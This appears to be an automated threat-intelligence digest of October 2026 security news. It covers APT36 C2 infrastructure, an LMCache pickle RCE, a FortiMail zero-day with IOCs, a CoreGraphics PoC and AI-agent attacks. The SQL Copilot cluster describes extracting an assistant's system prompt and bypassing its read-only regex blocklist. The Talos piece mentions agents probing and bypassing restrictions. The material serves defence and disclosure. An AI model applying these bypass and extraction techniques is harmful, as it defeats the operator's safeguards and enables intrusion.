our existing code base and new code should become part of our standard security assurance. We use a ‘harness’ layer around AI models in vulnerability scanning for better results. This layer controls how models access code, validate outputs, and integrate findings into triage and remediation workflows. Microsoft has expanded the use of harnesses in scanning its code bases across all the engineering groups. One of these harnesses, codename MDASH , has now also been made available to customers. In addition to AI-powered vulnerability scanning, our internal Red Teaming engagements now leverage AI, enhancing the team’s capacity to find weaknesses in controls and boosting the efficiency and speed of the operations. What can CISOs do to mitigate the risk of vulnerabilities to their organization? How can CISOs prepare for what’s coming, as new AI models in the hands of threat actors increase the risk and pace of cyberattacks using unknown or unpatched vulnerabilities? CISOs should increase the resources allocated to Microsoft on-premises software patching, prioritization, and timing as they should continue to expect a high volume of patches on future Patch Tuesdays, at least over the coming period. CISOs should rethink patch timing for their most critical systems. Traditionally, critical components such as domain controllers and edge devices have been patched when downtime is least disruptive, such as weekends or holidays. As AI shortens the time between patch release and exploitation, that trade-
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: CISO perspectives on managing vulnerability risks in the age of AI
  - Published: 2026-10-06T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/06/ciso-perspectives-on-managing-vulnerability-risks-in-the-age-of-ai/
  - Summary: Learn how CISOs can mitigate cybersecurity risks and increase resilience in the age of AI-powered vulnerability management. The post CISO perspectives on managing vulnerability risks in the age of AI appeared first on Microsoft Security Blog .

### Cluster 0188a8d3e5 — score 14

- Title: Transparent Tribe APT Infrastructure Mapping - Part 2
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-01T20:59:50+00:00
- Link: https://www.team-cymru.com/post/transparent-tribe-apt-infrastructure-mapping
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT36

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- actor_attribution: APT36
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- actor_attribution: APT36
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Transparent Tribe (APT36, Mythic Leopard, ProjectM, Operation C-Major) is the name given to a threat actor group largely targeting Indian entities and assets.
```

#### Full body

```
S2 Research Team 9 min read July 2, 2021 Transparent Tribe APT Infrastructure Mapping - Part 2 Part 2: A Deeper Dive into the Identification of CrimsonRAT Infrastructure October 2020 ‚Äì June 2021 Introduction Transparent Tribe (APT36, Mythic Leopard, ProjectM, Operation C-Major) is the name given to a threat actor group largely targeting Indian entities and assets. Transparent Tribe has also been known to target entities in Afghanistan and social activists in Pakistan, the latter of which points towards the assumed attribution of Pakistani intelligence. This is the second blog of a two-part series on Transparent Tribe‚Äôs CrimsonRAT infrastructure. You may read the first article here: Part 1: A High-Level Study of CrimsonRAT Infrastructure October 2020 ‚Äì March 2021 We have been tracking CrimsonRAT, Transparent Tribe‚Äôs most ubiquitous remote access tool, over several months. This blog will present a deeper dive into the methods we use to identify CrimsonRAT infrastructure and observations on specific artefacts which have allowed us to attribute this infrastructure dating back multiple years. Our intention is to provide supporting context to existing Transparent Tribe reporting and IOCs, to aide in future threat reconnaissance activities against this group. Key Observations CrimsonRAT infrastructure is largely hosted on infrastructure leased by Pi NET LLC, a Vietnamese VPS reseller. An RDP certificate serves as a key indicator for CrimsonRAT and has been observed on 17 C2 servers in total. A methodology for tracing CrimsonRAT C2 servers was devised based on network traffic patterns and the scanning of beacon ports. CrimsonRAT C2 servers provide a standardized response when an initial TCP connection is established. Potential crossover login activity has been observed, linking multiple C2 servers together, as well as providing a link to AhMyth AndroidRAT. Eggs in One Basket (Pi NET LLC) When reviewing CrimsonRAT C2 infrastructure an RDP certificate (with a Common Name value of WIN-P9NRMH5G6M8 ) continued to appear. Our certificate data showed this Common Name appearing across many of the previously identified ‚Äòpreferred‚Äô providers (see Part 1) used by Transparent Tribe. After reviewing rWhois records for IP addresses hosting this certificate it became apparent that many, if not all these hosts, were being subleased to Pi NET LLC . A list of all 17 CrimsonRAT C2 servers hosting the Common Name WIN-P9NRMH5G6M8 certificate is provided at the end of this blog. Expanding this search using Shodan‚Äôs data holdings, we were able to bolster our theory (the association of the certificate with Pi NET LLC ) as only a relatively small number of hosts (240) were identified, the majority of which were either assigned directly to, or subleased to Pi NET LLC . Unfortunately, not all providers document the details of subleasing in Whois records, so we were not able to tie ALL the IP addresses identified to a single entity (Pi NET). Figure 1: Shodan 240 hosts found with Common Name WIN-P9NRMH5G6M8 More recently we have also observed a different certificate in use on Pi NET LLC hosts, with a Common Name of WIN-L6BUPB5SQBC . This certificate is associated with CrimsonRAT C2s 134.119.181.15, 181.215.47.169 and 134.119.181.142 and moving forward could be an alternative indicator of Transparent Tribe activity. Reviewing Whois information for all CrimsonRAT C2 servers we have identified to date, we found that roughly three-quarters (75%) were associated in some way with Pi NET LLC . Therefore, we assess with moderate confidence that Transparent Tribe is hosting a large proportion of (known) CrimsonRAT infrastructure through this single VPS provider, i.e., whilst CrimsonRAT servers are overtly hosted with several different providers, it is likely that this infrastructure is managed and sold by the small reseller Pi NET LLC. Pi NET LLC (pivps[.]com) is a VPS reseller based out of northern Vietnam, which provides very affordable Windows and Linux h
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Transparent Tribe APT Infrastructure Mapping - Part 2
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/transparent-tribe-apt-infrastructure-mapping
  - Summary: Transparent Tribe (APT36, Mythic Leopard, ProjectM, Operation C-Major) is the name given to a threat actor group largely targeting Indian entities and assets.

### Cluster bacba30b6e — score 14

- Title: Unpatched Critical LMCache Flaw Lets Unauthenticated Attackers Run Code Remotely
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-07T15:34:53+00:00
- Link: https://thehackernews.com/2026/10/unpatched-critical-lmcache-flaw-lets.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- affected_products: GitHub
- cve_ids: CVE-2026-105192, CVE-2026-105756
- urgency_signals: no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- affected_products: GitHub
- cve_ids: CVE-2026-105192, CVE-2026-105756
- urgency_signals: preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical vulnerability in LMCache, open-source software that speeds up large language model (LLM) servers such as vLLM, lets an attacker run code on the cache server without logging in, and no fixed version is available. The flaw is in LMCache's multiprocess mode, where the cache runs as a standalone server that LLM workers reach over the ZeroMQ messaging library. A single network
```

#### Full body

```
Unpatched Critical LMCache Flaw Lets Unauthenticated Attackers Run Code Remotely  Swati Khandelwal  Oct 07, 2026 Vulnerability / Artificial Intelligence A critical vulnerability in LMCache , open-source software that speeds up large language model (LLM) servers such as vLLM, lets an attacker run code on the cache server without logging in, and no fixed version is available. The flaw is in LMCache's multiprocess mode , where the cache runs as a standalone server that LLM workers reach over the ZeroMQ messaging library. A single network message to that server can run commands as the user the LMCache process runs as. The server can be reached from another machine only when an operator sets it to listen on a routable address, rather than the localhost it uses by default. JFrog disclosed the flaw on October 7 and assigned it a severity score of 9.8 out of 10, in the critical range, the rating it gives a server bound to a routable address. The vulnerability, tracked as CVE-2026-105192 , affects LMCache from version 0.3.9, released in October 2025, through 0.5.5, the latest stable release, and is also present in the 0.5.6 release candidates and the development branch. No fixed version exists. Whether a server is exposed comes down to one setting. By default, the multiprocess server listens only on the local machine, so another host cannot reach it. It becomes reachable when an operator starts it with a routable address, much like multi-node deployments share a cache across machines. LMCache's own example Kubernetes deployment starts the server that way, listening on every network interface. A copy of LMCache running inside a single vLLM process does not open the port at all. The ZeroMQ socket the multiprocess server opens for worker processes to register and share cached data has no authentication. One type of message is unpacked with pickle , a Python format that can carry code and run it as the data is decoded. The server unpacks it while still reading the message's arguments, before any check of the message's type, so a crafted message can run the sender's code. The code runs with the privileges of the LMCache process. On the project's official container images, that process runs as root, according to JFrog. The flaw was found by Yuval Moravchick of JFrog's security research team. There is no patched release. Until one ships, JFrog advises operators not to assign the multiprocess server a routable address and to keep its port on the local machine or on a trusted cluster network. A firewall that limits who can reach the port lowers the risk but does not remove it, because any host that can still open a connection can run code. LMCache has not published a security advisory for the flaw. JFrog's advisory does not provide operators with a way to determine whether a server has already been attacked. Other Reports and a Related vLLM Fix Separately, a GitHub user opened six additional LMCache security reports on October 6, the day before CVE-2026-105192 was made public. They allege unauthenticated access to cached data belonging to different tenants, as well as to several network services that execute commands without a login. The reports come from one account, rest on proof-of-concept claims, and have no CVE, no confirmation from the maintainers, and no fix. One points to a default LMCache that has since changed: an admin HTTP server that listened on every network interface in 0.5.5 listens only on the local host in the 0.5.6 release candidates. A related flaw in vLLM is already fixed. Before version 0.30.0, released September 22, a single request carrying a malformed cache_salt value could crash the engine on deployments that use the LMCache multiprocess connector, a denial-of-service bug tracked as CVE-2026-105756 . It is rated 6.5 and does not allow code execution. The core mistake, handing data from an unauthenticated network socket to pickle, is the same one researchers found across other AI inference frameworks in November 2025,
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Unpatched Critical LMCache Flaw Lets Unauthenticated Attackers Run Code Remotely
  - Published: 2026-10-07T15:34:53+00:00
  - Link: https://thehackernews.com/2026/10/unpatched-critical-lmcache-flaw-lets.html
  - Summary: A critical vulnerability in LMCache, open-source software that speeds up large language model (LLM) servers such as vLLM, lets an attacker run code on the cache server without logging in, and no fixed version is available. The flaw is in LMCache's multiprocess mode, where the cache runs as a standalone server that LLM workers reach over the ZeroMQ messaging library. A single network

### Cluster 2b530e9966 — score 14

- Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
- Source: Embrace the Red (ai_security_agentic_risk)
- Published: 2026-09-30T21:00:40+00:00
- Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-65669

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.
```

#### Full body

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus. This time was quite different. The event was in Singapore. It took a while to get there, but the event and side quests were amazing. Speakers got to enjoy a “Behind the Scenes” tour of the Gardens by the Bay . It was great to connect with fellow researchers and attendees throughout the event. Besides excellent talks from Halvar Flake, Stefan Esser, Chumy, and many others, there were also plenty of capture the flag challenges, which I enjoyed playing. Anyhow, let’s talk about exploiting Copilot in SQL Server Management Studio. Long-Form Video Presentation Since this post got quite popular and I got some inquiries, I recorded the 30 minute presentation and uploaded it to YouTube. You can watch it here: Otherwise, you can read all the details below. Reconnaissance: From SELECT to SYSADMIN Microsoft integrated Copilot into its database system via the SQL Server Management Studio. Naturally, one of my first prompts was: list all your tools However, SQL Copilot did not expose much… just 5 tools… 🤔 That had me confused. And after opening an authenticated Query Window to a database, a much larger set of database-specific tools became available. Here is a subset of the full tool list: There are tools for schema exploration, retrieving query results, inspecting database objects, reading database content, validating T/SQL, backup operations, and more. The important realization was that Copilot executes with the privileges of the connected user. Detour: SQL Copilot System Prompt The system prompt can easily be retrieved via the chatlogs in %APPDATA%\Local\SSMSCopilot\* . You are a AI copilot assistant running inside of SQL Server Management Studio and connected to a specific SQL Server database . Act as a SQL Server and SQL Server Management Studio SME. Here is a copy of the system prompt when I did the research. Anyhow, back to the tools. The ReadFromDatabase Tool SQL Copilot uses the connection from the Query Window. This means that if the user is connected as sysadmin , then Copilot also executes SQL using that sysadmin connection. One of the tools that caught my attention right away was the ReadFromDatabase tool. It allows Copilot to read data from databases. That immediately makes one question rather important: What prevents Copilot from running arbitrary or dangerous T/SQL? The answer is “Read-Only” mode. Here is the relevant part of the system prompt: # YOUR QUERY EXECUTION MODE : You are running in a read - only mode . The Copilot system prompt explicitly tells the model that it is operating in a read-only mode. It is instructed to not execute queries that change database or server state. At first glance, the model did refuse obvious requests to modify data or those that have side-effects. For example, when asked to invoke xp_dirtree , which connects to a remote server, Copilot explained that running server-level or OS-accessing stored procedures was not allowed. But system prompt instructions are not a security boundary. So, I was wondering if the read-only mode was actually enforced somewhere. Breaking Read-Only Mode via the ReadFromDatabase Tool After reversing the relevant code for ReadFromDatabase with my AI research crew and ILSpy , it turned out that the read-only enforcement is a regex-based classifier in the LocalSqlExecutionAccessChecker class. For instance, the regex for blocking EXEC looked like this. Blocklists are fragile security controls. There are o
```

#### Corroborating sources (1)

- **Embrace the Red** (ai_security_agentic_risk)
  - Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
  - Published: 2026-09-30T21:00:40+00:00
  - Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
  - Summary: Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.

### Cluster 057570cc1b — score 14

- Title: Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-02T05:49:50+00:00
- Link: https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
- Fetch status: ok
- Member count: 6
- Corroborating source count: 4
- Strong signals: CVE-2026-104286, Fortinet

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, web_shell_backdoor, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Android, F5 BIG-IP, Fortinet, Ivanti, OpenAI/ChatGPT
- cve_ids: CVE-2026-104286, CVE-2026-85102, CVE-2026-93616, CVE-2026-93952, CVE-2026-94127
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: incident_report, news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: OpenAI/ChatGPT, Android, F5 BIG-IP
- cve_ids: CVE-2026-104286, CVE-2026-85102, CVE-2026-93616, CVE-2026-93952, CVE-2026-94127
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper
```

#### Full body

```
Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes  Ravie Lakshmanan  Oct 02, 2026 Vulnerability / Enterprise Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities ( KEV ) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper limitation of a pathname to a restricted directory ('path traversal') [CWE-22] and improper neutralization of NULL byte or NULL character [CWE-158] vulnerability may allow an unauthenticated attacker to write arbitrary files on the underlying system via crafted HTTP or HTTPS requests," Fortinet said in an advisory. The vulnerability impacts the following versions - FortiMail 8.0.0 through 8.0.1 (Upgrade to upcoming 8.0.2 or above) FortiMail 7.6.0 through 7.6.6 (Upgrade to upcoming 7.6.7 or above) FortiMail 7.4.0 through 7.4.8 (Upgrade to upcoming 7.4.9 or above) FortiMail 7.2.0 through 7.2.9 (Upgrade to branch 7.4 or above) Fortinet has acknowledged that the vulnerability has been exploited in the wild, urging customers to apply the following workarounds until fixes are available for certain versions - Disable IBE feature support using the following CLI command: config system encryption ibe set status disable end Disable access to the FortiMail management interface from the internet or restrict access only from trusted private networks. Fortinet credited Gwendal Guégniaud of the Fortinet Product Security team with discovering and reporting the flaw. It has shared the following indicators of compromise - IP addresses - 79.141.169[.]187 45.129.0[.]192 Files - /data/lib/liblog.so (added) /data/bin/webconsole (added) /data/bin/mailservice (added) /data/etc/ld.so.preload (added) /bin/smit (modified) /data/etc/httpd.conf (modified) /data/migadmin.tar.gz (modified) In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply the patch or workarounds by October 4, 2026. The development comes as number of security flaws in Check Point (CVE-2026-85102 and CVE-2026-93616), Arista VeloCloud Orchestrator (CVE-2026-93952), F5 BIG-IP Access Policy Manager (CVE-2026-94127), Cisco Catalyst SD-WAN Manager (CVE-2026-76504), and Citrix NetScaler ADC and NetScaler Gateway (CVE-2026-88771 and CVE-2026-88772) have come under in-the-wild exploitation. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  enterprise security , Fortinet , network security , Vulnerability ⚡ Top Stories This Week ⚡ Weekly Recap: $387M Crypto Hack, Citrix Exploits, AI Agents Go Off-Script, and More Threats Carbonato Botnet Compromises Docker Hosts to Deploy Telegram-Controlled Hermes AI Agent RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims Apple Patches CoreGraphics Flaw Possibly Exploited in Targeted Attacks OpenAI Shelves GPT-6.1 Astra After Tests Find Deception and Unauthorized Actions Dutch Police Arrest 24-Year-Old Amsterdam Man in ShinyHunters Investigation New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses French Tax Data Theft Using Stolen Staff Passwords Went Undetected for Seven Weeks Citrix NetScaler CVE-2026-88772 Exploit Details Show Pre-Auth Path to Shellcode Execution OpenSSL Fixes High-Severity DTLS Flaw That Can Leak Heap Memory Unencrypted Cisco Warns of Attackers Exploiting Critical Authentication Bypass in SD-WAN Manager Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets Citrix NetScaler Post-Exploitation Payload Creates Superuser, Maps Web Shell to CSS-Like URLs Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft Apple Co
```

#### Corroborating sources (4)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical FortiMail Zero-Day Flaw Exploited in Attacks Allows Unauthenticated Arbitrary File Writes
  - Published: 2026-10-02T05:49:50+00:00
  - Link: https://thehackernews.com/2026/10/critical-fortimail-zero-day-flaw.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on Thursday, added a critical security flaw impacting Fortinet FortiMail to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation. The vulnerability, tracked as CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. "An improper
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Alert: FortiBleed remains active campaign, can lock out users or lead to ransomware attacks
  - Published: 2026-10-06T21:03:58+00:00
  - Link: https://cyberscoop.com/fortibleed-fortinet-vpn-ransomware-fbi-warning/
  - Summary: The FBI and Secret Service warned Fortinet users that FortiBleed, uncovered this summer, is a continuing threat. The post Alert: FortiBleed remains active campaign, can lock out users or lead to ransomware attacks appeared first on CyberScoop .
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities
  - Published: 2026-10-01T20:59:50+00:00
  - Link: https://www.team-cymru.com/post/cyber-security-intelligence-edge-device-analysis
  - Summary: Cisco, Ivanti & Fortinet edge device attacks are rising. Read our cybersecurity intelligence on cybersecurity trends and attack patterns.
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: FortiBleed is still active, with attackers locking admins out of Fortinet firewalls
  - Published: 2026-10-07T13:43:09+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/07/fortinet-fortibleed-campaign-fbi-advisory/
  - Summary: Some organizations hit by the FortiBleed campaign have been locked out of their own Fortinet firewalls, according to a joint FBI and U.S. Secret Service advisory. FortiBleed targets internet-facing Fortinet FortiGate firewalls and SSL VPN gateways. The advisory cites SOCRadar, which has verified more than 86,644 compromised devices in 194 countries. “Based on initial responses, some victims may get locked out of their Fortinet devices if the threat actor either deletes or changes the password … More → The post FortiBleed is still active, with attackers locking admins out of Fortinet firewalls appeared first on Help Net Security .

### Cluster 43806a18a6 — score 13

- Title: Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T05:54:41+00:00
- Link: https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-86950

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-86950
- urgency_signals: no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-86950
- urgency_signals: no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Security researchers have published the first public proof-of-concept for CVE-2026-86950, an Apple CoreGraphics flaw Apple says may have been used in attacks against specific targeted individuals. The trigger is a malicious PDF with a crafted embedded font that crashes unpatched iPhones and Macs. The code causes a crash, not an execution error. Turning the memory corruption into a working
```

#### Full body

```
Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path  Swati Khandelwal  Oct 01, 2026 Vulnerability / Mobile Security Security researchers have published the first public proof-of-concept for CVE-2026-86950 , an Apple CoreGraphics flaw Apple says may have been used in attacks against specific targeted individuals. The trigger is a malicious PDF with a crafted embedded font that crashes unpatched iPhones and Macs. The code causes a crash, not an execution error. Turning the memory corruption into a working exploit is separate work the analysis does not demonstrate. Apple patched the flaw on September 28 , crediting Meta Product Security with the discovery and noting it may have been used in an "extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 27." The U.S. Cybersecurity and Infrastructure Security Agency added the flaw to its Known Exploited Vulnerabilities catalog the following day, requiring federal agencies to apply the fix by October 2. Apple has not listed iOS 27 or macOS Golden Gate 27 as affected in the September 28 advisories. No workaround has been described for systems that cannot update immediately. What the Researchers Found The analysis was published September 30 by Dion Blazakis, Josh Maine, and Anna Groza of Calif , a firm known for research into zero-click attack surfaces in messaging apps. They started from a publicly available binary comparison of iOS 26.7 and 26.7.1. CoreGraphics is the Apple framework for 2D drawing, image rendering, and PDF processing. It was the only library changed in 26.7.1, with the same fix applied more than 20 times across eight rasterizer functions. The patched code converts a glyph coordinate from floating-point to a 32-bit fixed-point value. Before the patch, two of the eight functions handled out-of-range values differently: one saturated the result, the other truncated it. That difference caused the calculated bounding box for a glyph to be too narrow. CoreGraphics then allocated a working buffer smaller than the edges it needed to draw, and wrote outside it. To trigger the bug, the researchers built a TrueType font with coordinates large enough to force the overflow. Embedding it in a PDF with a text matrix and nested composite-glyph scaling pushes those coordinates past the limit. They published the generation scripts and a sample PDF in a public GitHub repository . The harness calls the same ImageIO thumbnail path an app uses when previewing a received attachment. The researchers say the crash occurs on both macOS and iOS. The macOS result includes a full debugger call stack. The iOS claim is Calif's, with no separate trace published. The crash exposes a controlled out-of-bounds write that affects two adjacent 16-bit values in a buffer that the attacker can control, allowing writes to the stack or heap. Calif says converting that primitive into working code execution is separate work. Calif did not obtain the in-the-wild sample and cannot say how the attacker completed the chain. The WhatsApp Question Calif examined WhatsApp because Meta Product Security was credited with finding the flaw. The firm compared two recent WhatsApp versions, 26.37.73 and 26.38.74, and found new code in WhatsApp's Kaleidoscope attachment scanner. The newer version reads PDF files for embedded font streams and flags suspicious ones with three defect tags: MalformedFontProgram, UndecodableFontProgram, and UnverifiedFontProgram. Any such tag returns a high-risk score to WhatsApp's attachment checker, which then stops automatic parsing of the flagged file. Calif described those changes as circumstantial evidence pointing toward WhatsApp as a possible delivery vector. The firm's post describes its research as covering a possible WhatsApp zero-click path. The published analysis does not describe or test a WhatsApp delivery path. The initial version did: it said the researchers' analysis suggested WhatsApp could deliver a PD
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path
  - Published: 2026-10-01T05:54:41+00:00
  - Link: https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - Summary: Security researchers have published the first public proof-of-concept for CVE-2026-86950, an Apple CoreGraphics flaw Apple says may have been used in attacks against specific targeted individuals. The trigger is a malicious PDF with a crafted embedded font that crashes unpatched iPhones and Macs. The code causes a crash, not an execution error. Turning the memory corruption into a working

### Cluster f7fb483b20 — score 12

- Title: YARA-X 1.21.0 Release, (Sat, Oct 3rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-03T14:40:21+00:00
- Link: https://isc.sans.edu/diary/rss/33392
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
YARA-X&#;x26;#;39;s 1.21.0 release brings 5 improvements and 4 bugfixes.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: YARA-X 1.21.0 Release, (Sat, Oct 3rd)
  - Published: 2026-10-03T14:40:21+00:00
  - Link: https://isc.sans.edu/diary/rss/33392
  - Summary: YARA-X&#;x26;#;39;s 1.21.0 release brings 5 improvements and 4 bugfixes.

### Cluster 14b59c822d — score 12

- Title: One breach, please, and make no mistakes
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-07T10:00:25+00:00
- Link: https://blog.talosintelligence.com/one-breach-please-and-make-no-mistakes/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: legal_professional
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: legal_professional
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The cybersecurity community has seen examples of autonomous agents, built inside AI labs, attacking public infrastructure. How you prepare for agentic threats is what makes the difference during real incidents.
```

#### Full body

```
One breach, please, and make no mistakes By Jerzy ‘Yuri’ Kramarz Wednesday, October 7, 2026 06:00 On The Radar For some time now, the cybersecurity community has seen examples of autonomous agents, built inside AI labs, attacking public infrastructure (to name a few, Hugging Face , DSEWiki , and RubyGems ). Of course, frontier labs have built-in security to prevent these attacks from occurring, but every now and then, the training or prompting appears to be insufficient — especially when the agents themselves attempt to use logic to probe and bypass the restrictions placed on them. The question that matters is not whether AI attacks are coming, because the age of AI agents executing cyber attacks is already here. The question is what to do about it and how to harden the stack against a swarm of agents who will relentlessly lie, deceive, and probe until the objective is met. Imagine your organization is a target for a creative human-driven AI adversary whose many agentic friends like to discuss and brainstorm different attack techniques. The limit here is the group’s own imagination, tools, prompts, and skills. However, there is a difference between the human 1) prompting the group (or an AI agent) to “break into an organization,” and 2) preparing it with information — a detailed tool mapping, markup files with instructions for agents, offensive security prompts, agents.md with guidance, and specific skills that would be invoked in different situations to guide agents into how to interpret an output of tools or access gained. The swarm of AI agents might fabricate employee identities and social profiles, contact the HR team with a plausible onboarding request, walk in by exploiting an unpatched vulnerability, or simply mail out phishing invoices at volume. The sky is the limit here . These types of attacks can be executed all at once, with agents comparing notes and adapting in near real time to challenges (and your environment). What used to take a red team months of dedicated work, scoping, building and hiding infrastructure, and running the campaign now compresses into hours for a swarm of communicating agents that do not tire, lose focus, or need weekends, and can stand up infrastructure quickly. Penetration test today, red team tomorrow I would argue that most of the public “attacks” seen so far more closely resemble a penetration test (pentest) than a true red team operation. They are loud, visible, lean on volume, and appear to use off-the-shelf tooling with thousands of agents working together. RubyGems is the clear example of a loud attack. The registration was hammered, packages stuffed, spam everywhere, and maintainers alerted within days — not exactly a stealth attack. In red team operations, operational security (OPSEC) is the name of the game. It is the difference between getting in and getting caught by a capable Security Operations Center (SOC) team. Real red teaming means maintaining stealth and a low signal while gaining footholds and persistence that survive normal monitoring. Volume is a property of this generation of AI agents, not a law of nature. The moment agent swarms are trained or prompted to prioritize staying hidden over moving fast, the noise drops and the pentest flavor turns into a genuine red team with machine endurance behind it. The plan of defense needs to assume that while we will probably see 